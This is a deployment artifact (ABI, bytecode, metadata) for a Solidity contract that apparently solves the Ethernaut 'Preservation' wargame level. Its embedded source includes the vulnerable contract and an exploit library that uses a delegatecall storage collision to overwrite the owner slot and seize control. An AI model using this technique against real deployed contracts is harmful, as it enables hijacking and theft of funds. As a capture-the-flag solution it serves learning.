{
  "address": "0xcf53A8d8e3D5A4c60771E16904190CF9b2e871fD",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_input",
          "type": "address"
        }
      ],
      "name": "convertAddressToUint",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "convertUintToAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_address",
          "type": "uint256"
        }
      ],
      "name": "setTime",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x2a2460e4ca55ef9101deea8ac8fcd7a950e0b8d0239d1cdc57b828cb294f7cc7",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0xcf53A8d8e3D5A4c60771E16904190CF9b2e871fD",
    "transactionIndex": 5,
    "gasUsed": "202831",
    "logsBloom": "0x
    "blockHash": "0x0ca38b50ce765d730390469e23d20a626a22338f2d0bdfce8e1e4d89af75adbe",
    "transactionHash": "0x2a2460e4ca55ef9101deea8ac8fcd7a950e0b8d0239d1cdc57b828cb294f7cc7",
    "logs": [],
    "blockNumber": 8391268,
    "cumulativeGasUsed": "972512",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "6413ce6e805d00da6bf131ca87c555b3",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_input\",\"type\":\"address\"}],\"name\":\"convertAddressToUint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"convertUintToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_address\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Preservation.sol\":\"ExploitLibraryContract\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Preservation.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Preservation {\\n    // public library contracts\\n    address public timeZone1Library;\\n    address public timeZone2Library;\\n    address public owner;\\n    uint storedTime;\\n    // Sets the function signature for delegatecall\\n    bytes4 constant setTimeSignature = bytes4(keccak256(\\\"setTime(uint256)\\\"));\\n\\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\\n        timeZone1Library = _timeZone1LibraryAddress;\\n        timeZone2Library = _timeZone2LibraryAddress;\\n        owner = msg.sender;\\n    }\\n\\n    // set the time for timezone 1\\n    function setFirstTime(uint _timeStamp) public {\\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\\n    }\\n\\n    // set the time for timezone 2\\n    function setSecondTime(uint _timeStamp) public {\\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\\n    }\\n}\\n\\n// Simple library contract to set the time\\ncontract LibraryContract {\\n    // stores a timestamp\\n    uint storedTime;\\n\\n    function setTime(uint _time) public {\\n        storedTime = _time;\\n    }\\n}\\n\\n//-n Setup an exploit library contract that stores 3 values\\n//-n dummy 1 and dummy 2 correspond to storage slots of timeZone1Library & timeZone2Library in the preservation contract\\n//-n owner corresponds to the storage slot of owner in the Preservation contract\\n\\n//-n if we can somehow change the address of `timeZone1Library` contract\\n//-n we can deploy our own exploit contract that can override the storage slot of owner\\n//-n this can take complete control of the Preservation contract\\ncontract ExploitLibraryContract {\\n    uint dummy1;\\n    uint dummy2;\\n    address owner;\\n\\n    //-n we use the same signature as defined in Preservation contract\\n    //-n if next time setTime gets called with an address corresponding to this exploit library\\n    //-n owner storage slot will be overwritten with the address we are inputting -> enabling a full control on contract\\n    function setTime(uint _address) public {\\n        owner = convertUintToAddress(_address);\\n    }\\n\\n    //-n helper function to convert address to uint256\\n    function convertAddressToUint(address _input) public pure returns (uint) {\\n        return uint256(uint160(_input));\\n    }\\n\\n    //-n helper function to convert uint256 to address\\n    function convertUintToAddress(uint _value) public pure returns (address) {\\n        return address(uint160(_value));\\n    }\\n}\\n\",\"keccak256\":\"0xbaf47dfed7eaf9c5df29579289b8cd76ee7c4a9766dda901d0adba450118192b\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506102b5806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80633beb26c414610046578063d0b9679814610062578063f5c2db2b14610092575b600080fd5b610060600480360381019061005b9190610173565b6100c2565b005b61007c600480360381019061007791906101fe565b61010e565b604051610089919061023a565b60405180910390f35b6100ac60048036038101906100a79190610173565b61012e565b6040516100b99190610264565b60405180910390f35b6100cb8161012e565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008173ffffffffffffffffffffffffffffffffffffffff169050919050565b6000819050919050565b600080fd5b6000819050919050565b6101508161013d565b811461015b57600080fd5b50565b60008135905061016d81610147565b92915050565b60006020828403121561018957610188610138565b5b60006101978482850161015e565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101cb826101a0565b9050919050565b6101db816101c0565b81146101e657600080fd5b50565b6000813590506101f8816101d2565b92915050565b60006020828403121561021457610213610138565b5b6000610222848285016101e9565b91505092915050565b6102348161013d565b82525050565b600060208201905061024f600083018461022b565b92915050565b61025e816101c0565b82525050565b60006020820190506102796000830184610255565b9291505056fea264697066735822122055a67ea379e9c52c969a4bd2c8d3755ab73651cd2c92cb0b57e3418909c396de64736f6c63430008110033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100415760003560e01c80633beb26c414610046578063d0b9679814610062578063f5c2db2b14610092575b600080fd5b610060600480360381019061005b9190610173565b6100c2565b005b61007c600480360381019061007791906101fe565b61010e565b604051610089919061023a565b60405180910390f35b6100ac60048036038101906100a79190610173565b61012e565b6040516100b99190610264565b60405180910390f35b6100cb8161012e565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008173ffffffffffffffffffffffffffffffffffffffff169050919050565b6000819050919050565b600080fd5b6000819050919050565b6101508161013d565b811461015b57600080fd5b50565b60008135905061016d81610147565b92915050565b60006020828403121561018957610188610138565b5b60006101978482850161015e565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101cb826101a0565b9050919050565b6101db816101c0565b81146101e657600080fd5b50565b6000813590506101f8816101d2565b92915050565b60006020828403121561021457610213610138565b5b6000610222848285016101e9565b91505092915050565b6102348161013d565b82525050565b600060208201905061024f600083018461022b565b92915050565b61025e816101c0565b82525050565b60006020820190506102796000830184610255565b9291505056fea264697066735822122055a67ea379e9c52c969a4bd2c8d3755ab73651cd2c92cb0b57e3418909c396de64736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 86,
        "contract": "contracts/Preservation.sol:ExploitLibraryContract",
        "label": "dummy1",
        "offset": 0,
        "slot": "0",
        "type": "t_uint256"
      },
      {
        "astId": 88,
        "contract": "contracts/Preservation.sol:ExploitLibraryContract",
        "label": "dummy2",
        "offset": 0,
        "slot": "1",
        "type": "t_uint256"
      },
      {
        "astId": 90,
        "contract": "contracts/Preservation.sol:ExploitLibraryContract",
        "label": "owner",
        "offset": 0,
        "slot": "2",
        "type": "t_address"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}